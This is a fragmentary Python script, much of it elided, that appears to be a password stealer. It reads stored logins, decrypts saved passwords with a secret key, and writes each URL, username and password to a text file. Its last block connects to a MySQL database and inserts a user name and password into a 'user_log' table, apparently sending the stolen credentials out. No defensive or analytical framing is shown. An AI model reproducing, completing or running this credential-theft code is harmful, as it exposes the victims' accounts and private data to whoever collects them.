...
def save_password_to_txt(url, username, password):
    with open('password.txt', 'a', encoding='utf-8') as password_file:
                ...
                if secret_key and conn:
                    ...
                    for index, login in enumerate(cursor.fetchall()):
                        ...
                        if url and username and ciphertext:
                            ...
                            save_password_to_txt(url, username, decrypted_password)
...
if conn.is_connected():
    print("yea")
    cursor = conn.cursor()
    cursor.execute("INSERT INTO user_log (data, user, password) VALUES ( %s, %s, %s)" , ('data' ,user, readpass))
    conn.commit()
